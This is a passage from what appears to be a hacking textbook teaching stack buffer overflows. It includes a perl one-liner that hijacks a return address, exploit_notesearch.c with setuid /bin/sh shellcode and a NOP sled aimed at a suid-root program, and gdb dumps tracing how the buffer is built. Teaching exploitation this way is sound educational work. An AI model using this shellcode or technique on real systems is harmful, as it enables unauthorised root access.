left;">[esp],0x804864d</p></td></tr><tr style="height:31pt"><td style="width:47pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 107%;text-align: left;">0x080484ec 0x080484f1</p><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x080484f2</p></td><td style="width:53pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&lt;main+120&gt;:</p><p class="s42" style="padding-left: 2pt;text-indent: 0pt;text-align: left;">&lt;main+125&gt;:</p><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">&lt;main+126&gt;:</p></td><td style="width:30pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 107%;text-align: left;">call leave</p><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">ret</p></td><td style="width:45pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: center;">0x804831c</p></td><td style="width:98pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&lt;printf@plt&gt;</p></td></tr></table><p class="s31" style="padding-top: 1pt;padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">End of assembler dump. (gdb)</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_386.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 18pt;line-height: 107%;text-align: left;">This section of code shown in bold contains the instructions that display the <span class="s27">Access Granted </span>message. The beginning of this section is at <span class="s31">0x080484bf</span>, so if the return address is overwritten with this value, this block of instruc- tions will be executed. The exact distance between the return address and the start of the <span class="s31">password_buffer </span>can change due to different compiler versions and different optimization flags. As long as the start of the buffer is aligned with DWORDs on the stack, this mutability can be accounted for by simply repeating the return address many times. This way, at least one of the instances will overwrite the return address, even if it has shifted around due to compiler optimizations.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_387.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ ./auth_overflow2 $(perl -e &#39;print &quot;\xbf\x84\x04\x08&quot;x10&#39;)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 18pt;text-indent: 0pt;text-align: center;">-=-=-=-=-=-=-=-=-=-=-=-=-=-</p><p class="s31" style="padding-left: 18pt;text-indent: 0pt;text-align: center;">Access Granted.</p><p class="s31" style="padding-left: 18pt;text-indent: 0pt;text-align: center;">-=-=-=-=-=-=-=-=-=-=-=-=-=-</p><p class="s31" style="padding-bottom: 2pt;padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">Segmentation fault (core dumped) reader@hacking:~/booksrc $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_388.png"/></span></p><p style="padding-top: 8pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">In the example above, the target address of <span class="s31">0x080484bf </span>is repeated 10 times to ensure the return address is overwritten with the new target address. When the <span class="s31">check_authentication() </span>function returns, execution jumps directly to the new target address instead of returning to the next instruction after the call. This gives us more control; however, we are still limited to using instructions that exist in the original programming.</p><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">The notesearch program is vulnerable to a buffer overflow on the line marked in bold here.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_389.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">int main(int argc, char *argv[]) {</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;line-height: 107%;text-align: left;">int userid, printing=1, fd; // File descriptor char searchstring[100];</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;text-align: left;">if(argc &gt; 1)            // If there is an arg</p><p class="s46" style="padding-left: 104pt;text-indent: 12pt;line-height: 107%;text-align: left;">strcpy(searchstring, argv[1]);  <span class="s31">//  that is the search string; else                // otherwise,</span></p><p class="s31" style="padding-bottom: 3pt;padding-left: 116pt;text-indent: 0pt;text-align: left;">searchstring[0] = 0;      //  search string is empty.</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_390.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 107%;text-align: left;">The notesearch exploit uses a similar technique to overflow a buffer into the return address; however, it also injects its own instructions into memory and then returns execution there. These instructions are called <span class="s27">shellcode</span>, and they tell the program to restore privileges and open a shell prompt. This is especially devastating for the notesearch program, since it is suid root. Since this program expects multiuser access, it runs under higher privileges so it can access its data file, but the program logic prevents the user from using these higher privileges for anything other than accessing the data file—at least that’s the intention.</p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">But when new instructions can be injected in and execution can be controlled with a buffer overflow, the program logic is meaningless. This technique allows the program to do things it was never programmed to do, while it’s still running with elevated privileges. This is the dangerous combina- tion that allows the notesearch exploit to gain a root shell. Let’s examine the exploit further.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_391.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ gcc -g exploit_notesearch.c reader@hacking:~/booksrc $ gdb -q ./a.out</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">Using host libthread_db library &quot;/lib/tls/i686/cmov/libthread_db.so.1&quot;. (gdb) list 1</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">1   #include &lt;stdio.h&gt;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">2   #include &lt;stdlib.h&gt;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">3   #include &lt;string.h&gt;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">4    char shellcode[]=</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">5     &quot;\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68&quot;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">6    &quot;\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89&quot;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">7   &quot;\xe1\xcd\x80&quot;;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">8</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">9    int main(int argc, char *argv[]) {</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">10     unsigned int i, *ptr, ret, offset=270; (gdb)</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">11    char *command, *buffer; 12</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">13    command = (char *) malloc(200);</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">14    bzero(command, 200); // Zero out the new memory. 15</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">16     strcpy(command, &quot;./notesearch \&#39;&quot;); // Start command buffer.</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">17     buffer = command + strlen(command); // Set buffer at the end. 18</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">19     if(argc &gt; 1) // Set offset.</p><p class="s31" style="padding-top: 2pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">20       offset = atoi(argv[1]); (gdb)</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">21</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">22    ret = (unsigned int) &amp;i - offset; // Set return address. 23</p><p class="s46" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">24     for(i=0; i &lt; 160; i+=4) <span class="s31">// Fill buffer with return address.</span></p><p class="s46" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">25      *((unsigned int *)(buffer+i)) = ret;</p><p class="s46" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">26    memset(buffer, 0x90, 60); <span class="s31">// Build NOP sled.</span></p><p class="s46" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">27    memcpy(buffer+60, shellcode, sizeof(shellcode)-1);</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">28</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">29    strcat(command, &quot;\&#39;&quot;);</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">30</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) break 26</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">Breakpoint 1 at 0x80485fa: file exploit_notesearch.c, line 26. (gdb) break 27</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">Breakpoint 2 at 0x8048615: file exploit_notesearch.c, line 27. (gdb) break 28</p><p class="s31" style="padding-bottom: 2pt;padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">Breakpoint 3 at 0x8048633: file exploit_notesearch.c, line 28. (gdb)</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_392.png"/></span></p><p style="padding-top: 8pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">The notesearch exploit generates a buffer in lines 24 through 27 (shown above in bold). The first part is a for loop that fills the buffer with a 4-byte address stored in the <span class="s31">ret </span>variable. The loop increments <span class="s31">i </span>by 4 each time. This value is added to the buffer address, and the whole thing is typecast as a unsigned integer pointer. This has a size of 4, so when the whole thing is dereferenced, the entire 4-byte value found in <span class="s31">ret </span>is written.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_393.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) run</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Starting program: /home/reader/booksrc/a.out</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Breakpoint 1, main (argc=1, argv=0xbffff894) at exploit_notesearch.c:26</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">26     memset(buffer, 0x90, 60); // build NOP sled (gdb) x/40x buffer</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 106%;text-align: justify;">0x804a016:    0xbffff6f6    0xbffff6f6    0xbffff6f6    0xbffff6f6 0x804a026:    0xbffff6f6    0xbffff6f6    0xbffff6f6    0xbffff6f6 0x804a036:    0xbffff6f6    0xbffff6f6    0xbffff6f6    0xbffff6f6 0x804a046:    0xbffff6f6    0xbffff6f6    0xbffff6f6    0xbffff6f6 0x804a056:    0xbffff6f6    0xbffff6f6    0xbffff6f6    0xbffff6f6 0x804a066:    0xbffff6f6    0xbffff6f6    0xbffff6f6    0xbffff6f6 0x804a076:    0xbffff6f6    0xbffff6f6    0xbffff6f6    0xbffff6f6 0x804a086:    0xbffff6f6    0xbffff6f6    0xbffff6f6    0xbffff6f6 0x804a096:    0xbffff6f6    0xbffff6f6    0xbffff6f6    0xbffff6f6 0x804a0a6:    0xbffff6f6    0xbffff6f6    0xbffff6f6    0xbffff6f6 (gdb) x/s command</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">0x804a008:   &quot;./notesearch &#39;¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶û ÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿&quot;</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb)</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_394.png"/></span></p><p style="padding-top: 8pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">At the first breakpoint, the buffer pointer shows the result of the for loop. You can also see the relationship between the command pointer and the buffer pointer. The next instruction is a call to <span class="s31">memset()</span>, which starts at the beginning of the buffer and sets 60 bytes of memory with the value <span class="s31">0x90</span>.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_395.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">(gdb) cont Continuing.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Breakpoint 2, main (argc=1, argv=0xbffff894) at exploit_notesearch.c:27</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">27    memcpy(buffer+60, shellcode, sizeof(shellcode)-1); (gdb) x/40x buffer</p><table style="border-collapse:collapse;margin-left:16.94pt" cellspacing="0"><tr style="height:10pt"><td style="width:58pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x804a016:</p></td><td style="width:68pt"><p class="s42" style="padding-left: 11pt;padding-right: 11pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0x90909090</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x90909090</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x90909090</p></td><td style="width:58pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0x90909090</p></td></tr><tr style="height:11pt"><td style="width:58pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x804a026:</p></td><td style="width:68pt"><p class="s42" style="padding-left: 11pt;padding-right: 11pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0x90909090</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x90909090</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x90909090</p></td><td style="width:58pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0x90909090</p></td></tr><tr style="height:11pt"><td style="width:58pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x804a036:</p></td><td style="width:68pt"><p class="s42" style="padding-left: 11pt;padding-right: 11pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0x90909090</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x90909090</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x90909090</p></td><td style="width:58pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0x90909090</p></td></tr><tr style="height:11pt"><td style="width:58pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x804a046:</p></td><td style="width:68pt"><p class="s42" style="padding-left: 11pt;padding-right: 11pt;text-indent: 0pt;line-height: 10pt;text-align: center;">0x90909090</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x90909090</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x90909090</p></td><td style="width:58pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 10pt;text-align: right;">0xbffff6f6</p></td></tr><tr style="height:11pt"><td style="width:58pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x804a056:</p></td><td style="width:68pt"><p class="s42" style="padding-left: 11pt;padding-right: 11pt;text-indent: 0pt;line-height: 10pt;text-align: center;">0xbffff6f6</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0xbffff6f6</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0xbffff6f6</p></td><td style="width:58pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 10pt;text-align: right;">0xbffff6f6</p></td></tr><tr style="height:11pt"><td style="width:58pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x804a066:</p></td><td style="width:68pt"><p class="s42" style="padding-left: 11pt;padding-right: 11pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0xbffff6f6</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff6f6</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff6f6</p></td><td style="width:58pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0xbffff6f6</p></td></tr><tr style="height:11pt"><td style="width:58pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x804a076:</p></td><td style="width:68pt"><p class="s42" style="padding-left: 11pt;padding-right: 11pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0xbffff6f6</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff6f6</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff6f6</p></td><td style="width:58pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0xbffff6f6</p></td></tr><tr style="height:11pt"><td style="width:58pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x804a086:</p></td><td style="width:68pt"><p class="s42" style="padding-left: 11pt;padding-right: 11pt;text-indent: 0pt;line-height: 10pt;text-align: center;">0xbffff6f6</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0xbffff6f6</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0xbffff6f6</p></td><td style="width:58pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 10pt;text-align: right;">0xbffff6f6</p></td></tr><tr style="height:11pt"><td style="width:58pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x804a096:</p></td><td style="width:68pt"><p class="s42" style="padding-left: 11pt;padding-right: 11pt;text-indent: 0pt;line-height: 10pt;text-align: center;">0xbffff6f6</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0xbffff6f6</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0xbffff6f6</p></td><td style="width:58pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 10pt;text-align: right;">0xbffff6f6</p></td></tr><tr style="height:10pt"><td style="width:58pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x804a0a6:</p></td><td style="width:68pt"><p class="s42" style="padding-left: 11pt;padding-right: 11pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0xbffff6f6</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff6f6</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff6f6</p></td><td style="width:58pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0xbffff6f6</p></td></tr></table><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) x/s command</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x804a008:   &quot;./notesearch &#39;&quot;, &#39;\220&#39; &lt;repeats 60 times&gt;, &quot;¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿&quot; (gdb)</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_396.png"/></span></p><p style="padding-top: 7pt;padding-left: 109pt;text-indent: 0pt;text-align: left;">Finally, the call to <span class="s31">memcpy() </span>will copy the shellcode bytes into <span class="s31">buffer+60</span>.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_397.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) cont Continuing.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Breakpoint 3, main (argc=1, argv=0xbffff894) at exploit_notesearch.c:29</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">29    strcat(command, &quot;\&#39;&quot;); (gdb) x/40x buffer</p><table style="border-collapse:collapse;margin-left:16.94pt" cellspacing="0"><tr style="height:10pt"><td style="width:58pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x804a016:</p></td><td style="width:68pt"><p class="s42" style="padding-left: 11pt;padding-right: 11pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0x90909090</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x90909090</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x90909090</p></td><td style="width:58pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0x90909090</p></td></tr><tr style="height:11pt"><td style="width:58pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x804a026:</p></td><td style="width:68pt"><p class="s42" style="padding-left: 11pt;padding-right: 11pt;text-indent: 0pt;line-height: 10pt;text-align: center;">0x90909090</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x90909090</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x90909090</p></td><td style="width:58pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 10pt;text-align: right;">0x90909090</p></td></tr><tr style="height:11pt"><td style="width:58pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x804a036:</p></td><td style="width:68pt"><p class="s42" style="padding-left: 11pt;padding-right: 11pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0x90909090</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x90909090</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x90909090</p></td><td style="width:58pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0x90909090</p></td></tr><tr style="height:11pt"><td style="width:58pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x804a046:</p></td><td style="width:68pt"><p class="s42" style="padding-left: 11pt;padding-right: 11pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0x90909090</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x90909090</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x90909090</p></td><td style="width:58pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0x3158466a</p></td></tr><tr style="height:11pt"><td style="width:58pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x804a056:</p></td><td style="width:68pt"><p class="s42" style="padding-left: 11pt;padding-right: 11pt;text-indent: 0pt;line-height: 10pt;text-align: center;">0xcdc931db</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x2f685180</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x6868732f</p></td><td style="width:58pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 10pt;text-align: right;">0x6e69622f</p></td></tr><tr style="height:11pt"><td style="width:58pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x804a066:</p></td><td style="width:68pt"><p class="s42" style="padding-left: 11pt;padding-right: 11pt;text-indent: 0pt;line-height: 10pt;text-align: center;">0x5351e389</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0xb099e189</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0xbf80cd0b</p></td><td style="width:58pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 10pt;text-align: right;">0xbffff6f6</p></td></tr><tr style="height:11pt"><td style="width:58pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x804a076:</p></td><td style="width:68pt"><p class="s42" style="padding-left: 11pt;padding-right: 11pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0xbffff6f6</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff6f6</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff6f6</p></td><td style="width:58pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0xbffff6f6</p></td></tr><tr style="height:11pt"><td style="width:58pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x804a086:</p></td><td style="width:68pt"><p class="s42" style="padding-left: 11pt;padding-right: 11pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0xbffff6f6</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff6f6</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff6f6</p></td><td style="width:58pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0xbffff6f6</p></td></tr><tr style="height:11pt"><td style="width:58pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x804a096:</p></td><td style="width:68pt"><p class="s42" style="padding-left: 11pt;padding-right: 11pt;text-indent: 0pt;line-height: 10pt;text-align: center;">0xbffff6f6</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0xbffff6f6</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0xbffff6f6</p></td><td style="width:58pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 10pt;text-align: right;">0xbffff6f6</p></td></tr><tr style="height:10pt"><td style="width:58pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x804a0a6:</p></td><td style="width:68pt"><p class="s42" style="padding-left: 11pt;padding-right: 11pt;text-indent: 